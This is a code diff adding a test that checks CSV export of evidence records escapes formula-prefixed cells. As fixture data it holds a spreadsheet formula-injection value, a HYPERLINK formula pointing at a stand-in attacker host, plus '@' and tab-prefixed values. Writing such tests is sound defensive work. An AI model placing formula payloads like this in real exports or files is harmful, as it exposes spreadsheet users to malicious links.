@@ -275,6 +275,25 @@ class TestExportEvidence:
         assert "/Users/alice" not in exported
         assert "csv-1" in exported
 
+    def test_export_csv_sanitizes_formula_prefixed_cells(self, tmp_path: Path) -> None:
+        conn = _db(tmp_path)
+        store_evidence(
+            conn,
+            _rec(
+                evidence_id="csv-formula-1",
+                summary="=HYPERLINK(\"https://evil.example\")",
+                category="@formula",
+                signal_id="\tsecret-tab",
+            ),
+        )
+
+        exported = export_evidence_csv(conn)
+
+        assert "'=HYPERLINK(" in exported
+        assert "'@formula" in exported
+        assert "'\tsecret-tab" in exported
+        assert ",=HYPERLINK(" not in exported
+
 
 class TestCompactEvidence:
     def test_compact_removes_old(self, tmp_path: Path) -> None:
